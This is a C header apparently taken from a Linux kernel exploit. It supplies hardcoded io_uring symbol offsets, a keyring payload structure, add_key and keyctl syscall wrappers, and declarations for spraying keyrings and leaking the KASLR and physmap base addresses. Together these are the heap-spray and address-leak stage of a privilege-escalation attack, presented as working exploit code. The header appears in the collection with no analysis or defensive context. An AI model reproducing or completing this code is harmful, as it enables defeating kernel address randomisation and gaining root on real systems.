#ifndef _KEYRING_H_
#define _KEYRING_H_

#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>

#include "setup.h"

#define IO_RING_CTX_REF_FREE_OFFSET 0x3dfa00

#define IO_RSRC_NODE_REF_ZERO_OFFSET 0x3e04f0

#define KEY_DESC_MAX_SIZE 232

#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16

#define SPRAY_KEY_SIZE 2

#define PHYSMAP_MASK 0xffffffff00000000

struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    unsigned short len;
};

struct leak {
    long kaslr_base;
    long physmap_base;
};

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

key_serial_t *spray_keyring(uint32_t spray_size);
struct leak *get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size);
void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size);

#endif /* _KEYRING_H_ */